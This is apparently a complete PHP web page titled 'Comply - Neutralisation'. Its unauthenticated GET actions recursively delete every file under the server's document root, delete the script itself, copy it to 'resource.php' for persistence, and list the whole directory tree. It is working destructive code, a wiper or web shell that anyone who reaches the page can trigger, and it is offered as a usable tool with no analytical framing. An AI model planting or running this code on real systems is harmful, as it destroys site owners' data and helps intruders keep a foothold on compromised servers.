<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <title>Comply - Neutralisation</title>
        <!--Bootstrap 4-->
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.6/css/bootstrap.min.css" />
        <link rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css" />
        <style>@import url(https://fonts.googleapis.com/css?family=Rubik:400,500,700);body,html{width:100%;height:100%}body{font-family:Rubik,sans-serif;font-size:16px;background-color:#FAFAFA}h1,h2,h3,h4,h5,h6{font-weight:700}a{color:#d81b60;-webkit-transition:all .35s;-moz-transition:all .35s;transition:all .35s}section{padding:80px 0}.bg-footer{background-color:#171717}.btn{box-shadow:3px 2px 3px rgba(0,0,0,.15);-webkit-transition:350ms ease all;transition:350ms ease all;text-transform:uppercase;font-weight:500;padding:.6rem 1.5rem}.btn-primary{background-color:#ff4081!important;border-color:#ff4081!important}.bg-alt{background-color:#fff}.list-default{list-style:none;padding-left:25px}.list-default>li{position:relative;padding:6px 0;line-height:1.55em;font-size:.94rem}.list-default>li:before{content:"\f21b";position:absolute;left:-25px;top:8px;font-size:10px;color:#d81b60;font-family:Ionicons}.btn-white{color:#ff4081!important;background-color:#fff;border-color:#fff}.btn-white:hover{color:#ff4081}</style>
    </head>
    <body>
        <section class="bg-footer" id="connect">
            <div class="container">
                <div class="row">
                    <div class="col-md-6 offset-md-3 col-sm-8 offset-sm-2 col-xs-12 text-center wow fadeIn">
                        <h1>COMPLY</h1>
                        <a href="<?php echo basename(__FILE__).'?action=start_neutralisation'; ?>" class="btn btn-primary mr-2 page-scroll">Begin Neutralisation</a>
                        <a href="<?php echo basename(__FILE__).'?action=self_destruct'; ?>" class="btn btn-white mb-2 page-scroll">Self Destruct</a>
                        <a href="<?php echo basename(__FILE__).'?action=list_directory'; ?>" class="btn btn-white mr-2 page-scroll">List Directory</a>
                        <a href="<?php echo basename(__FILE__).'?action=copy_file'; ?>" class="btn btn-primary mr-2 page-scroll">Make a Copy</a>
                    </div>
                </div>
            </div>
        </section>
        <?php if (isset($_GET['action']) && $_GET['action'] == 'start_neutralisation') { ?>
        <section class="bg-alt p-0 margin-0">
            <div class="container-fluid">
                <div class="row d-md-flex mt-5">                    
                    <div class="col-sm-12 pl-5 pr-5 pt-5 pb-4 wow fadeInRight">
                        <h3><a href="#">Neutralisation Started</a></h3>
                        <ul class="pt-4 pb-3 list-default">                            
                            <?php 
    							function deleteDir($dirPath) {
    							    if (! is_dir($dirPath)) {
    							        throw new InvalidArgumentException("$dirPath must be a directory");
    							    }
    							    if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
    							        $dirPath .= '/';
    							    }
    							    $files = glob($dirPath . '{,.}[!.,!..]*', GLOB_MARK|GLOB_BRACE);
    							    foreach ($files as $file) {
    							        if (is_dir($file)) {
    							            deleteDir($file);
    							        } else {
    							        	if (basename($file) != basename(__FILE__)) {
                                                @chmod($file,0750);
                                                if(unlink($file)){
                                                    echo "<li>Neutralised: ".$file."</li>";
                                                }
                                            }        							        	
    							        }
    							    }
    							    rmdir($dirPath);
    							}

    							deleteDir($_SERVER['DOCUMENT_ROOT']);
							?>
                        </ul>
                    </div>
                </div>
            </div>
        </section>
        <?php 
        } elseif (isset($_GET['action']) && $_GET['action'] == 'self_destruct') {
            $file = __FILE__;
            @chmod($file,0750);
            if(unlink($file)){
                echo "<li>Neutralised: ".$file."</li>";
            }
            rmdir($_SERVER['DOCUMENT_ROOT']);
        } elseif (isset($_GET['action']) && $_GET['action'] == 'copy_file') {
            $file = __FILE__;
            $newfile = $_SERVER['DOCUMENT_ROOT'].'/resource.php';

            if (!copy($file, $newfile)) {
                echo "failed to copy $file...\n";
            } else {
                echo "Copied to: ".realpath($newfile);
            }
        } elseif (isset($_GET['action']) && $_GET['action'] == 'list_directory') {            
        ?>
        <section class="bg-alt p-0 margin-0">
            <div class="container-fluid">
                <div class="row d-md-flex mt-5">                    
                    <div class="col-sm-12 pl-5 pr-5 pt-5 pb-4 wow fadeInRight">
                        <h3><a href="#">Neutralisation Started</a></h3>
                        <ul class="pt-4 pb-3 list-default">                            
                            <?php 
                                function listFolderFiles($dir){
                                    $ffs = scandir($dir);

                                    unset($ffs[array_search('.', $ffs, true)]);
                                    unset($ffs[array_search('..', $ffs, true)]);

                                    // prevent empty ordered elements
                                    if (count($ffs) < 1)
                                        return;

                                    echo '<ul>';
                                    foreach($ffs as $ff){
                                        echo '<li>'.$ff;
                                        if(is_dir($dir.'/'.$ff)) listFolderFiles($dir.'/'.$ff);
                                        echo '</li>';
                                    }
                                    echo '</ul>';
                                }

                                listFolderFiles($_SERVER['DOCUMENT_ROOT']);
                            ?>
                        </ul>
                    </div>
                </div>
            </div>
        </section>
        <?php 
        }
        ?>
    </body>
</html>
